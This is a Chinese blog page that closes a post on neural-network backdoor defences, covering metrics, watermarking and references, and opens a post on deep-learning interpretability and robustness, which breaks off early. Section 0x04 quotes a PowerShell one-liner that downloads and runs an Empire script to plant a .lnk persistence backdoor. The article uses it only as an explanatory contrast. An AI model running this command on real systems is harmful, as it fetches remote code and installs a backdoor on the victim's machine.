<p>同样地，在介绍完典型的防御方案之后，我们来看看评估防御方案有效性的指标有哪些。这里要注意，前两个指标一般方案都会涉及，但是由于不同的方案侧重于不同的角度，并不是下列的指标都适用所有方案。</p>
<p>1）Attack rate deduction(ARD)：这是衡量在防御前后攻击成功率的差异。这反映了防御方案在应对攻击时的有效程度。ARD越大自然说明防御效果越好。</p>
<p>2）Clean accuracy drop(CAD)：这是衡量在防御前后良性样本输入模型后模型的准确率的变化。这是在观察防御措施是否会对模型的正常功能造成影响。CAD越小说明影响越小。</p>
<p>3）True positive rate(TPR)：这是Input-filtering类型的防御方案特有的指标，衡量检测trigger input的能力</p>
<p>4）Anomaly index value(AIV)：这是对于model-inspection类型的防御方案特有的指标，该指标用于刻画植入后门的模型的异常度。因为我们知道，这种类型大部分的方法都是将寻找后门模型形式化为离群点检测，每一个类都有相关联的分数，如果某一个类的分数显著与其他的不同，则很有可能是后门。一般来说，AIV如果大于2则有95%的概率可以被认为是异常的。</p>
<p>5）Mask L1 norm(MLN)：这是针对model-inspection类型的防御方案特有的指标，用于衡量由该方案恢复出的trigger的l1范数。</p>
<p>6）Mask jaccard similarity(MJS)：衡量防御防范恢复出的trigger和本身的trigger的交集，这是在观察恢复出的trigger的质量</p>
<p>7）Average running time(ART):衡量防御方案的性能，主要指运行时间。对于model sanitization或者model inspection类型来说，ART是在每个模型上运行的时间；对于input filtering或者input reformation类型来说，ART是在每个input上运行的时间。</p>
<h1 id="x06">0x06</h1>
<p>后门并非只可以用于攻击，它也有积极的一面，我们在这一小节进行介绍。</p>
<p>我们把后门的性质抽象出来：一种技术，可以在接收到特定输入时表现异常，而其余情况下表现正常。</p>
<p>这是不是可以让我们很直接就联想到水印技术？</p>
<p>比如Adi等人[18]就是用类似植入后门的方式为神经网络加水印。</p>
<p>我们知道水印可以用来证明模型所有者，保护知识产权。那么面对模型窃取这种场景，水印方法是否可以解决呢？</p>
<p>这里简单介绍一下模型窃取。模型窃取指攻击者利用模型窃取攻击来窃取供应商提供的模型，例如机器学习即服务（mlaas），通常依赖于查询受害模型并观察返回的响应。此攻击过程类似于密码学中的明文选择攻击。</p>
<p>传统的水印可以做，但是存在一个问题：负责主要任务和水印（后门）任务的模型参数是分开的。因此，当攻击者查询旨在窃取主要任务功能的模型时，作为不同子任务的水印可能不会传播到被窃副本，而这里防御的关键是模型提供者插入的后门将不可避免地传播到被盗模型，事实上Jia[19]等人已经实现了这方面的防御方案。</p>
<p>后门是一门技术，用于消极的一面还是积极的一面，用于什么场景完全取决于我们的想法，本文上述列举的工作仅是部分典型，如果有兴趣的读者可以进一步自行深入研究。</p>
<p>0x07</p>
<p>后门攻防领域的研究一直在不断探索中，在本文的最后根据笔者经验简单指出可以进一步研究的方向，限于笔者水平，可能一些研究方向没有研究价值或已经在近期发表了，希望读者可以批判看待：</p>
<p>1）运行机制</p>
<p>后门的生成机制、trigger激活后门的机制并不透明，这也涉及到深度学习系统的不可解释下问题，如果这些机制可以被深入研究清楚，那么未来后门领域的攻防将会更有效、更精彩。</p>
<p>2）防御措施</p>
<p>目前的防御措施都是针对特定的攻击手段进行防御的，并不存在一种通用的解决方案，究竟有没有这种方案，如果有的话应该怎么实现目前来看都是未知的。此外，一些方案要求有海量良性数据集，一些方案要求强大的计算资源，这些是否是必要的，是否可以进一步改进也是值得研究的。</p>
<p>3）攻击方案</p>
<p>深度学习应用的场景都很多，但是大部分后门攻击仅仅关注于图像识别、自动驾驶等领域，在语音识别、推荐系统等方面还缺乏深入研究。另外，对抗攻击具有可迁移性，那么后门攻击是否可以实现也是未知的，这也是可以进一步研究的方向。</p>
<p>4）trigger的设计</p>
<p>尽管我们前面看到的那篇文章将trigger设计的很自然，但是毕竟没有消除trigger，是否有可能在trigger的模式上进行优化，比如自动适应图像，将trigger叠加在肉眼不可见的地方，这方面的研究并不完善。目前的trigger设计都是启发式的，是否可以将其形式化为一个可优化的式子进行研究目前也是不清楚的。</p>
<h1 id="x07">0x07</h1>
<p>参考：</p>
<p>[1]https://zh.wikipedia.org/wiki/%E8%BB%9F%E9%AB%94%E5%BE%8C%E9%96%80</p>
<p>[2]Gu T, Dolan-Gavitt B, Garg S. Badnets: Identifying vulnerabilities in the machine learning model supply chain[J]. arXiv preprint arXiv:1708.06733, 2017.</p>
<p>[3]Liu Y, Ma S, Aafer Y, et al. Trojaning attack on neural networks[J]. 2017.</p>
<p>[4]https://towardsdatascience.com/poisoning-attacks-on-machine-learning-1ff247c254db</p>
<p>[5]Yuan X, He P, Zhu Q, et al. Adversarial examples: Attacks and defenses for deep learning[J]. IEEE transactions on neural networks and learning systems, 2019, 30(9): 2805-2824.</p>
<p>[6]Li J, Ji R, Liu H, et al. Universal perturbation attack against image retrieval[C]//Proceedings of the IEEE/CVF International Conference on Computer Vision. 2019: 4899-4908.</p>
<p>[7]Tang R, Du M, Liu N, et al. An embarrassingly simple approach for trojan attack in deep neural networks[C]//Proceedings of the 26th ACM SIGKDD International Conference on Knowledge Discovery &amp; Data Mining. 2020: 218-228.</p>
<p>[8]Liu Y, Ma X, Bailey J, et al. Reflection backdoor: A natural backdoor attack on deep neural networks[C]//European Conference on Computer Vision. Springer, Cham, 2020: 182-199.</p>
<p>[9]Chen, X., Liu, C., Li, B., Lu, K., Song, D.: Targeted backdoor attacks on deeplearning systems using data poisoning. arXiv preprint arXiv:1712.05526 (2017)</p>
<p>[10]Barni, M., Kallas, K., Tondi, B.: A new backdoor attack in cnns by training setcorruption without label poisoning. In: IEEE International Conference on ImageProcessing (ICIP). pp. 101–105. IEEE (2019)</p>
<p>[11]Tran, B., Li, J., Madry, A.: Spectral signatures in backdoor attacks. In: NIPS(2018)</p>
<p>[12] Turner A, Tsipras D, Madry A. Clean-label backdoor attacks[J]. 2018.</p>
<p>[13]Te Lester Juin Tan and Reza Shokri. Bypassing Backdoor Detection Algorithms in Deep Learning. In Proceedings of IEEE European Symposium on Security and Privacy (Euro S&amp;P), 2020.</p>
<p>[14]W. Xu, D. Evans, and Y. Qi. Feature Squeezing: Detecting Adversarial Examples in Deep Neural Networks. In Proceedings of Network and Distributed System Security Symposium (NDSS), 2018.</p>
<p>[15]Yansong Gao, Chang Xu, Derui Wang, Shiping Chen, Damith Ranas- inghe, and Surya Nepal. STRIP: A Defence Against Trojan Attacks on Deep Neural Networks. In Proceedings of Annual Computer Security Applications Conference (ACSAC), 2019.</p>
<p>[16]Kang Liu, Brendan Dolan-Gavitt, and Siddharth Garg. Fine-Pruning: Defending Against Backdooring Attacks on Deep Neural Networks. In Proceedings of Symposium on Research in Attacks, Intrusions and Defenses (RAID), 2018.</p>
<p>[17]Huili Chen, Cheng Fu, Jishen Zhao, and Farinaz Koushanfar. DeepIn- spect: A Black-box Trojan Detection and Mitigation Framework for Deep Neural Networks. In Proceedings of International Joint Confer- ence on Artificial Intelligence, 2019.</p>
<p>[18]Y. Adi, C. Baum, M. Cisse, B. Pinkas, and J. Keshet, “Turning your weakness into a strength: Watermarking deep neural networks by backdooring,” in USENIX Security Symposium, 2018.</p>
<p>[19]H. Jia, C. A. Choquette-Choo, and N. Papernot, “Entangled wa- termarks as a defense against model extraction,” arXiv preprint arXiv:2002.12200, 2020.</p>
<p>[20]Li Y, Wu B, Jiang Y, et al. Backdoor learning: A survey[J]. arXiv preprint arXiv:2007.08745, 2020.</p>
<p>[21]Gao Y, Doan B G, Zhang Z, et al. Backdoor attacks and countermeasures on deep learning: a comprehensive review[J]. arXiv preprint arXiv:2007.10760, 2020.</p>
<p>[22]Pang R, Zhang Z, Gao X, et al. TROJANZOO: Everything you ever wanted to know about neural backdoors (but were afraid to ask)[J]. arXiv preprint arXiv:2012.09302, 2020.</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/09/29/how-to-attack-dl-system-research-on-explain-and-robustness/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Elwood's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2021/09/29/how-to-attack-dl-system-research-on-explain-and-robustness/" itemprop="url">how_to_attack_dl_system_research_on_explain_and_robustness</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-09-29T21:07:53+08:00">
                2021-09-29
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/AI/" itemprop="url" rel="index">
                    <span itemprop="name">AI</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>​</p>
<h1 id="x00">0x00</h1>
<p>人工智能广泛渗透于我们的生活场景中，随处可见。比如人脸识别解锁、人脸识别支付、语音输入，输入法自动联想等等，不过这些场景其实传统的模式识别或者机器学习方法就可以解决，目前来看真正能代表人工智能最前沿发展的莫过于深度学习，尤其是深度学习在无人驾驶、医疗决策（如通过识别拍片结果诊断是否有相应疾病）领域的应用。</p>
<p>不过深度学习存在所谓的黑箱问题，由此带来了不可解释性，而这一点如果不能解决（事实上目前为止还没有很好解决）将会导致在深度学习在对安全性很敏感的领域中应用的受限。比如将其应用在医疗领域时，深度学习系统根据医学影像判断病人为癌症，但是不能解释为什么给出这个判断，而人类医学专家认为不是癌症，那么这时存在两种情况，一种是深度学习系统错了；第二种则是专家错了，可是由于系统无法给出解释，所以专家未必采纳系统意见，则造成病人的损失。无论是哪种情况，都可以看到不解决深度学习的可解释性问题，其未来的应用发展是一定会受到限制的。</p>
<p>本文的安排如下，在0x01会介绍深度学习相较于传统方法的特点；0x02至0x04会介绍深度学习的不可解释性，进而引出业界对为了实现可解释性做出的工作，其中在0x02会介绍设计可解释模型方面的工作，在0x03介绍将可解释性引入已有模型的工作，0x04会介绍可解释性与深度学习安全性的关系。在0x05将会介绍模型的鲁棒性及相关研究，在0x06部分从模型、数据、承载系统三方面展开深度学习自身安全性问题的阐述。</p>
<h1 id="x01">0x01</h1>
<p>在0x00中我们谈到了人工智能、模式识别、机器学习、深度学习，这四个领域其实都是相互联系的。</p>
<p>我们先来进行简单的区分。后三者都是实现人工智能的途径，其中我们特别需要把深度学习与模式识别、机器学习这两个领域区分开来。</p>
<p>所谓模式识别就是通过计算机用数学技术方法来研究模式的自动处理和判读。我们把环境与客体统称为“模式”。随着计算机技术的发展，人类会研究复杂的信息处理过程，一个重要形式是生命体对环境及客体的识别。以光学字符识别之“汉字识别”为例：首先将汉字图像进行处理，抽取主要表达特征并将特征与汉字的代码存在计算机中。就像老师教我们“这个字叫什么、如何写”记在大脑中。这一过程叫做“训练”。识别过程就是将输入的汉字图像经处理后与计算机中的所有字进行比较，找出最相近的字就是识别结果。这一过程叫做“匹配”。</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/29/how-to-attack-dl-system-research-on-explain-and-robustness/wpsp3gCjh.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>机器学习的流程也与此类似，这里不展开，接下来看看深度学习。</p>
<p>深度学习其是机器学习中一种基于对数据进行表征学习的算法。观测值（例如一幅图像）可以使用多种方式来表示，如每个像素强度值的向量，或者更抽象地表示成一系列边、特定形状的区域等。而使用某些特定的表示方法更容易从实例中学习任务（例如人脸识别）。</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/29/how-to-attack-dl-system-research-on-explain-and-robustness/wpsalvDX2.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>从上面的描述中我们可以看到深度学习是机器学习的一个分支，不过其最明显的特点在于会对数据进行表征学习。表征学习的目标是寻求更好的表示方法并创建更好的模型来从大规模未标记数据中学习这些表示方法。可以看到，相比于传统的模式识别、机器学习需要手工提取特征，深度学习最大的优势是可以自动从数据中提取特征。</p>
<p>举个例子，使用机器学习系统识别一只狼，我们需要手动提取、输入我们人类可以将动物识别为狼的特征，比如体表毛茸茸、有两只凶狠的眼睛等；而使用深度学习系统，我们只需要将大量的狼的图片输入系统，它就会自动学习特征。</p>
<h1 id="x02">0x02</h1>
<p>深度学习的优点在于学习能力强、覆盖范围广、数据驱动，其缺点在于计算量大、硬件需求高、模型设计复杂。这是事实，但是作为安全研究人员，我们更需要关注的不是怎么搭房子（怎么设计深度学习系统），而是怎么拆房子（如何对其进行攻击）以及如果搭更坚固的房子（如何进行针对性防御）。</p>
<p>这里非常关键的一点，就是模型的可解释性问题。</p>
<p>还是以前面设计识别狼的人工智能系统为例，在Macro[3]等人研究的工作中发现，深度学习系统会将西伯利亚哈士奇识别为狼，最后找到的原因是因为在训练系统时，输入的狼的图片上的背景大多是皑皑白雪，使得系统在自动提取特征时将白雪背景作为了识别狼的标志。所以当我们给出一张西伯利亚哈士奇的图片（如下右图所示）时，就会被系统识别为狼。下左图为通过LIME的解释性方法说明是系统做根据背景中的白雪做出判断的。</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/29/how-to-attack-dl-system-research-on-explain-and-robustness/wps2tE9W0.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>可以看到，系统使用了图片的背景并完全忽略了动物的特征。模型原本应该关注动物的眼睛。</p>
<p>相似的案例还有不少，比如特斯拉在佛罗里达州发生的事故[4]。</p>
<p>2016年5月，美国佛罗里达州一位男子驾驶开启自动驾驶模式后，特斯拉Model S撞上一辆正在马路中间行驶的半挂卡车，导致驾驶员当场死亡。事后排查原因时发现，主要是因为图像识别系统没能把货车的白色车厢与大背景中的蓝天白云区分开导致的，系统认为是卡车是蓝天白云时就不会自动刹车进而引发了事故。</p>
<p>这充分说明深度学习的可解释性的重要。</p>
<p>深度学习缺乏可解释性，其原因是因为其黑箱特性。我们知道在神经网络计算过程中会自动从原始数据中提取特征并拆分、组合，构成其判别依据，而我们人类却可能无法理解其提取的特征。进一步地，当模型最后输出结果时，它是根据哪些方面、哪些特征得到这个结果的也就是说，对于我们而言该过程是不可解释的。</p>
<p>事实上，不论工业界还是学术界都意识到了深度学习可解释性的重要性，《Nature》《Science》都有专题文章讨论,如[5][6],AAAI 2019也设置了可解释性人工智能专题[7]，DARPA也在尝试建立可解释性深度学习系统[8]</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/29/how-to-attack-dl-system-research-on-explain-and-robustness/wpsNc5TXS.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>就目前研究现状来看，主要可以分为2个方面。</p>
<p>一方面是设计自身就带有可解释性的模型，另一方面是使用可解释性技术来解释已有的模型。</p>
<p>在前一方面，已有的研究主要可以分为三类。</p>
<p>1）自解释模型</p>
<p>这主要在传统的机器学习算法中比较常见，比如1）在Naive Bayes模型中，由于条件独立性的假设，我们可以将模型的决策过程转换为概率运算[10]；2）在线性模型中，基于模型权重，通过矩阵运算线性组合样本的特征值，展现出线性模型的决策过程[11]；3）在决策树模型中，每一条从根节点到不同叶子节点的路径都代表着不同的决策规则，因为决策结果实际是由一系列If-then组成的决策规则构造出来的[12]，下图就是参考文献[12]中举的一个决策树判别实例</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/29/how-to-attack-dl-system-research-on-explain-and-robustness/wpsai2KC5.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>2）广义加性模型</p>
<p>广义加性模型通过线性函数组合每一单特征模型得到最终的决策形式，一般形式为g(y)= f1(x1)+ f2(x2)+... + fn(xn)，其特点在于有高准确率的同时保留了可解释性。由其一般形式可以看到，因为我们是通过简单的线性函数组合每一个单特征模型得到最终决策形式，消除了特征之间的相互作用，从而保留了简单线性模型良好的可解释性。</p>
<p>典型工作如Poulin等人提出的方案[13]，设计了ExplainD原型，提供了对加性模型的图形化解释，包括对模型整体的理解以及决策特征的可视化，以帮助建立用户与决策系统之间的信任关系。下图就是利用设计的原因对朴素贝叶斯决策作出解释。</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/29/how-to-attack-dl-system-research-on-explain-and-robustness/wpsONOgfS.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>3）注意力机制</p>
<p>注意力机制是解决信息超载问题的一种有效手段，通过决定需要关注的输入部分，将有限的信息处理资源分配给更重要的任务。更重要的是，注意力机制具有良好的可解释性，注意力权重矩阵直接体现了模型在决策过程中感兴趣的区域。</p>
<p>典型工作如Xu等人[14]将注意力机制应用于看图说话(Image Caption)任务中以产生对图片 的描述。首先利用卷积神经网络(CNN)提取图片特征，然后基于提取的特征，利用带注意力机制的循环神经网络(RNN)生成描述。在这个过程中，注意力实现了单词与图片之间的对齐，因此，通过可视化注意力权重矩阵，人们可以清楚地了解到模型在生成每一 个单词时所对应的感兴趣的图片区域，如下所示</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/29/how-to-attack-dl-system-research-on-explain-and-robustness/wps0xLCK6.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>0x03</p>
<p>在第二方面，即对已有的模型做解释，可以分为两种研究角度，一种是从全局可解释性，旨在理解模型的整体逻辑及内部工作机制；一种是局部可解释性，旨在对特定输入样本的决策过程做出解释。</p>
<p>从全局可解释性角度来进行的研究工作也有很多，这里简单介绍三类。</p>
<p>1）规则提取</p>
<p>这种方法利用可理解的规则集合生成可解释的符号描述，或提取出可解释模型使其具有与原来的黑盒模型相当的决策能力。这种方法实现了对黑盒模型内部工作机制的深入理解。</p>
<p>如Anand[15]的工作，他们提出的方案是使用一个紧凑的二叉树，来明确表示黑盒机器学习模型中隐含的最重要的决策规则。该树是从贡献矩阵中学习的，该贡献矩阵包括输入变量对每个预测的预测分数。</p>
<p>如下图所示</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/29/how-to-attack-dl-system-research-on-explain-and-robustness/wpshy3NkK.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>从第1行到第4行，每行都有一个来自MIT Place 365场景理解数据集中“卧室”，“客厅”，“厨房”和“浴室”四类的示例图像。第一列是原始图像。第二列显示通过语义分割算法找到的语义类别。第3列显示了实际的语义分割，其中每个图像包含几个超像素。使用局部预测解释器，我们可以获得每个超像素（即语义类别）对预测分数的贡献。第4列显示了重要的语义超像素（具有最高的贡献分数），分别针对相应的地面真实类别分数以绿色突出显示。可以对于“卧室”图像，“床”和“地板”超像素很重要。对于“客厅”图像，“沙发”，“窗玻璃”和“壁炉”很重要。对于“厨房”形象，“柜子”是最重要的。最后对于“浴室”形象，“厕所”，“纱门”起着最重要的作用。所有这些解释对于我们人类来说似乎都是合理的。</p>
<p>进一步地，在获得测量每个语义类别对于每个图像的场景类别的重要性的贡献矩阵之后，我们可以通过递归分区（GIRP）算法进行全局解释，以生成每个类别的解释树，如下所示</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/29/how-to-attack-dl-system-research-on-explain-and-robustness/wpsuvkxf3.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>这就是将图片归类为对应场景时产生的决策树。</p>
<p>2）模型蒸馏</p>
<p>模型蒸馏的思想是通过模型压缩，用结构紧凑的学生模型来模拟结构复杂的教师模型，从而降低复杂度。因为通过模型蒸馏可以实现教师模型到学生模型的知识迁移，所以可以将学生模型看做是教师模型的全局近似，那么我们就可以基于简单的学生模型对教师模型提供全局解释，这也就要求学生模型应该选择具有良好解释性的模型，如线性模型、决策树、广义加行性模型等。Frosst等[16]扩展了Hinton提出的知识蒸馏方法，提出利用决策树来模拟复杂深度神经网络模型的决策,如下所示</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/29/how-to-attack-dl-system-research-on-explain-and-robustness/wpsX7uO1F.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>这是将神经网络蒸馏为soft decision tree得到的结果。内部节点上的图像是学习到的过滤器，叶子上的图像是学习到的概率分布在类上的可视化。标注了每个叶子上的最终最可能分类以及每个边上的可能分类。</p>
<p>3）激活最大化</p>
<p>激活最大化方法是指通过在特定的层上找到神经元的首选输入最大化神经元激活，其思想很简单，就是通过寻找有界范数的输入模式，最大限度地激活给定的隐藏单元，而一个单元最大限度地响应的输入模式可能是一个单元正在做什么的良好的一阶表示。这一过程可以被形式化为</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/29/how-to-attack-dl-system-research-on-explain-and-robustness/wpsMlNGO2.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>得到x*后对其可视化，则可以帮助我们理解该神经元在其感受野中所捕获到的内容。</p>
<p>如Karen等人的工作[17],其方案是针对图像分类模型的可视化，实现了两种可视化技术，其一是生成一个图像，最大化类分数，从而可视化由卷积网络捕获的类的概念。第二种技术特定于给定的图像和类，计算一个类显著图。这些技术可以帮助解释模型是如何进行分类决策的。</p>
<p>部分实验如下所示</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/29/how-to-attack-dl-system-research-on-explain-and-robustness/wps29mzIo.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>这是ILSVRC-2013竞赛图像中排名靠前的预测类的图像特定类显著图saliency map，这些图是使用单次反向传播通过分类卷积网络提取的。直观的来说，之所以会将中间图片分类为金丝猴，是因为其对应的显著图中亮起来的部分（及金丝猴的身子），而不是因为树枝等其他原因才将其识别为金丝猴。</p>
<p>从局部可解释性角度的工作相较于全局可解释性的工作更多，因为模型的不透明性、复杂性等问题使得做出全局解释更加困难。这里也简单列举三种类型。</p>
<p>1）敏感性分析</p>
<p>敏感性分析是指在给定假设下，定量分析相关自变量的变化对因变量的影响程度，核心思想是通过逐一改变自变量的值来解释因变量受自变量变化影响大小的规律。将其应用于模型局部解释方法中，可以用来分析样本的每一维特征对模型最终分类结果的影响，以提供对某一个特定决策结果的解释。</p>
<p>Li[18]等人的工作指出，通过观察修改或删除特征子集前后模型决策结果的相应变化的方式来推断待解释样本的决策特征。其中一个实验结果如下</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/29/how-to-attack-dl-system-research-on-explain-and-robustness/wpsiDXX1R.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>这是通过Bi-LSTM模型获得的具有较高负重要性得分（使用公式1计算）的单词。负重要性意味着删除单词时模型会做出更好的预测。 ++，+，0，-，-分别表示正性，正性，中性，负性和强烈的负面情绪标签。</p>
<p>2）局部近似</p>
<p>这种方法的核心思想是利用结构简单的可解释模型拟合待解释模型针对某一输入实例的决策结果，然后基于解释模型对该决策结果进行解释。</p>
<p>Ribeiro等人[19]提出了一种称之为锚点解释(Anchor)的局部解释方法，针对每一个输入实例，该方法利用被称之为“锚点”的if-then 规则来逼近待解释模型的局部边界。下图是其实验结果</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/29/how-to-attack-dl-system-research-on-explain-and-robustness/wpsqN0bFk.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>上图中，在d中，我们设置的锚点是what，可视化后可以看到b中只保留了小猎犬的图像，而回答为dog，在e中锚点同样为加粗的词，结合c中可视化后的图像，可以看到保留了相关特征，从而顺利回答对应问题。</p>
<p>3）特征反演</p>
<p>特征反演可视化和理解DNN中间特征表征的技术，可以充分利用模型的中间层信息，以提供对模型整体行为及模型决策结果的解释。Dumengnao等人的工作[20]基于该思想，设计的方案可以了解输入样本中每个特征的贡献，此外通过在DNN的输出层进一步与目标类别的神经元进行交互，使得解释结果具有类区分性。其中一个实验结果如下</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/29/how-to-attack-dl-system-research-on-explain-and-robustness/wpszM7KPo.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>这是在三种类型的DNN上应用提出的方案进行解释，其中热力图明显区域正是模型做出判断时关注的区域。</p>
<h1 id="x04">0x04</h1>
<p>在讨论深度学习安全性的文章里花了这么多的篇幅来引入可解释性，原因在于，对于我们后面即将介绍的攻击手段而言，正是因为深度学习存在不可解释性，所以攻防过程并不直观，这也就意味着攻防双方博弈时可操作的空间很大。</p>
<p>以后门攻防为例。</p>
<p>后门植入神经网络的过程并不直观，不像我们传统软件安全里嵌入后门时，加一段代码即可，比如下面这段代码</p>
<p>“”powershell-nop -exec bypass -c "IEX (New-ObjectNet.WebClient).DownloadString('https://github.com/EmpireProject/Empire/raw/master/data/module_source/persistence/Invoke-BackdoorLNK.ps1');Invoke-BackdoorLNK-LNKPath 'C:PremiumPremium.lnk' -EncScript Base64encode"</p>
<p>这是在使用经典Powershell攻击框架Empire中的一个ps1脚本。</p>
<p>（具体如何在神经网络中植入后门将会在后门的部分详细介绍。）</p>
<p>也正是由于其不可解释性，我们不知道被植入后门的神经网络究竟是如何起到后门攻击作用的，所以模式的使用者或者防御者不能无法通过传统的应对方法来进行检测防御，比如md5校验、特征码提取匹配等在神经网络上都是不适用的，这也就引来众多科研人员针对后门防御展开广泛研究，同样地，细节也会在后面文章中展开。</p>
<p>再来看对抗样本攻击方面。</p>
<p>我们知道其本质思想都是通过向输入中添加扰动以转移模型的决策注意力，最终使模型决策出错。由于这种攻击使得模型决策依据发生变化，因而解释方法针对对抗样本的解释结果必然与其针对对应的正常样本的解释结果不同。因此，我们可以通过对比并利用这种解释结果的反差来检测对抗样本，并且由于这种方法并不特定于某一种对抗攻击，因而可以弥补传统经验性防御的不足。</p>
<p>此外，在深度学习安全攻防领域的研究中，很多地方都会涉及可解释性的利用。</p>
<p>比如用来优化对抗样本的扰动，使其攻击更有效的同时降低与原图的误差；比如用于优化后门攻击中后门的植入、或是优化Trigger的pattern设计等。</p>
<p>我们可以具体来看一个例子。</p>
<p>在对抗样本领域，在白盒攻击方面，一开始GoodFellow[21]等人提出了FGSM，而后Papernot等人[22]基于Grad解释方法生成显著图，基于显著图挑选最重要的特征进行攻击，从而在保证高攻击成功率的同时也保持更强的隐蔽性。在黑盒攻击领域，Papernot等[23]提出了针对黑盒模型的替代模型攻击方案，主要就是通过模型蒸馏解释方法的思想训练替代模型来拟合目标黑盒模型，之后就回答白盒攻击上。这都是可解释性对于攻击手段的赋能。</p>
<h1 id="x05">0x05</h1>
<p>这一部分我们会讨论深度学习模型的鲁棒性问题。</p>
<p>“鲁棒”的英文是robustness，中文译为强健，稳健，模型的鲁棒性直白点说就是健壮的、稳健的模型。Huber从稳健统计的角度系统地给出了鲁棒过程所满足的3个层面:一是模型需要具有较高的精度或有效性; 二是对于模型假设出现的较小偏差, 只对算法性能产生较小的影响; 三是对于模型假设出现的较大偏差, 而不对算法性能产生“灾难性”的影响[24].</p>
<p>那么深度学习模型是否足够鲁棒呢？如果仔细看了上文，不论是特斯拉的事故、哈士奇被识别为狼还是对抗样本，不论输入样本是否为故意构造出来的，深度学习系统的表现都足以说明这个答案很明显是否定的。模型之所以会表现错误，主要是因为样本存在人类无法感知的扰动，其不干扰人类认知却能使机器学习模型做出错误判断。</p>
<p>那么为什么深度学习系统的鲁棒性堪忧呢？</p>
<p>一方面是由于神经网络中非线性激活函数和复杂结构的存在，深度神经网络具有非线性、非凸性的特点，因此很难估计其输出范围；另一方面，神经网络一般具有大规模的节点，对于任何大型网络，其所有组合的详尽枚举对资源消耗很大，很难准确估计输出范围。</p>
<p>事实上，深度学习鲁棒性的研究一般都是和对抗样本攻防联系在一起的。</p>
<p>鲁棒性，和可解释性一样，对于那些安全敏感型的应用领域亟待解决的问题，我们需要为模型的鲁棒性提供理论上的安全保证。为了实现这一点，我们需要计算模型的鲁棒性边界。</p>
<p>所谓模型鲁棒性边界是针对某个具体样本而言的，是保证模型预测正确的条件下样本的最大可扰动范围，即模型对这个样本的分类决策不会在这个边界内变化。</p>
<p>由于鲁棒性研究领域对基础理论要求较高，且由公式解释，所以本文不再展开，给出几篇经典参考文献供感兴趣的读者阅读。</p>
<p>对模型鲁棒性分析的方法，可以简单分为精确方法和近似方法两类。</p>
<p>精确方法计算代价大，一般适用于小规模网络，但是可以确定精确的鲁棒性边界，代表性工作有[25][26][27];近似方法可以适用于复杂网络，但是只能证明近似的鲁棒性边界，代表性工作有[28][29][30].</p>
<p>至于对抗样本和鲁棒性的研究，则会安排在后续介绍对抗样本的文章中。</p>
<h1 id="x06">0x06</h1>
<p>这一部分将会介绍深度学习系统面临的安全性问题，事实上，接下来的内容针对所有人工智能系统都适用，不过目前深度学习是最具代表性的技术，并且也是对抗样本、后门攻击等主流攻击手段的对象，所以从深度学习的安全性来进行论述。</p>
<p>从深度学习涉及的组件来看，可以分为模型、数据以及其承载系统。</p>
